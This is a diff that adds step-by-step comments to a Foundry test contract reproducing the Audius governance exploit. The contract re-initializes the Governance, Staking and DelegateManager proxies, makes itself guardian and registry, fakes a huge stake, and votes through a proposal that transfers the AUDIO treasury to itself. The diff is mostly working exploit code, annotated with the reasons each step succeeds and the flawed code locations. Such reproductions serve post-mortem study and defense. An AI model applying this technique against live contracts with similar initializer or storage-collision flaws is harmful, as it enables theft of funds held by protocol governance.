@@ -124,6 +124,12 @@ contract AttackContract is Test {
         // uint16 _maxInProgressProposals,
         // address _guardianAddress
         // )
+
+        // EXPLOIT STEP 1: Re-initialize Governance proxy (vuln in Governance.initialize + storage collision in Audius proxy/Initializable)
+        // This bypasses the already-initialized guard (see Governance.sol:5446 initializer modifier and proxyAdmin slot collision).
+        // Sets registry to attacker (for getContract spoof to return AUDIO), guardian=self (allows direct guardian actions or easy proposals), short timers.
+        // Why works: attacker contract can satisfy the (ineffective due to layout) proxyAdmin==msg.sender and reset params.
+        // Impact: attacker gains god-mode over governance and can target AUDIO treasury for transfer.
         IGovernence(governance).initialize(address(this), 3, 0, 1, 4, address(this));
 
         console.log("Evaluate Proposal..."); // this is to make sure one can submit new proposals
@@ -141,6 +147,12 @@ contract AttackContract is Test {
         //     string calldata _name,
         //     string calldata _description
         // ) external returns (uint256)
+
+        // EXPLOIT STEP 2: Submit malicious proposal targeting AUDIO via spoofed registry key.
+        // The _targetContractRegistryKey=3078 will be resolved by registry.getContract (now points to this contract because of reinit)
+        // via our getContract() returning AUDIO. Proposal encodes governance's own AUDIO.transfer(to=self, 99%).
+        // submitProposal accepts because we are now guardianAddress (set in step1), bypassing stake check.
+        // See Governance.sol:5529 registry.getContract + 5552 target resolution + 5499 proposer==guardian.
         IGovernence(governance).submitProposal(
             bytes32(uint256(3078)),
             0,
@@ -150,6 +162,12 @@ contract AttackContract is Test {
             "World"
         );
 
+        // EXPLOIT STEP 3: Re-initialize Staking + DelegateManagerV2 with attacker-controlled "governance".
+        // This sets their internal governanceAddress = address(this) (our fake gov that will answer isGovernanceAddress()=true).
+        // Also setServiceProviderFactory to self, then delegateStake a huge amount (1e31) to self.
+        // Why succeeds: the _updateGovernanceAddress only checks the isGovernanceAddress() callback (spoofable) + initializer guard ineffective.
+        // Why needed: later submitVote and _calculateAddressActiveStake will read from these contracts and see our huge stake.
+        // See Staking.sol:1846 _updateGovernanceAddress + DelegateManagerV2:5248 + delegateStake.
         IStaking(staking).initialize(address(this), address(this));
         IDelegateManagerV2(delegatemanager).initialize(address(this), address(this), 1);
         IDelegateManagerV2(delegatemanager).setServiceProviderFactoryAddress(address(this));
@@ -158,11 +176,20 @@ contract AttackContract is Test {
         console.log("-------------------- Tx2 --------------------");
         console.log("SubmitVote `Yes` for malicious ProposalId 85...");
         cheat.roll(15_201_795);
+        // EXPLOIT STEP 4: Cast Yes vote with spoofed huge stake.
+        // submitVote succeeds because _calculateAddressActiveStake (via the now-faked staking/delegate) returns >0 for us.
+        // Also our attack contract implements any other validation callbacks (validateAccountStakeBalance etc).
+        // Roll forward so we are in voting window.
         IGovernence(governance).submitVote(85, IGovernence.Vote(2)); // Voting Yes
 
         console.log("-------------------- Tx3 --------------------");
         console.log("Execute malicious ProposalId 85...");
         cheat.roll(15_201_798);
+        // EXPLOIT STEP 5: Evaluate/execute the proposal.
+        // evaluateProposalOutcome sees quorum+yes > no (due to our faked stake), resolves target via (fake) registry.getContract -> AUDIO,
+        // then _executeTransaction does AUDIO.call( transfer(this, amount) ) with governance as the from (msg.sender for the token).
+        // Governance held the AUDIO treasury, so transfer succeeds with no access control on the token transfer itself.
+        // See Governance.sol:5768 _executeTransaction + 6235 target.call(transfer) .
         IGovernence(governance).evaluateProposalOutcome(85); // callback this.getContract()
         uint256 audioBalance_this = IERC20(AUDIO).balanceOf(address(this));
         emit log_named_decimal_uint("AttackContract AUDIO Balance", audioBalance_this, 18);
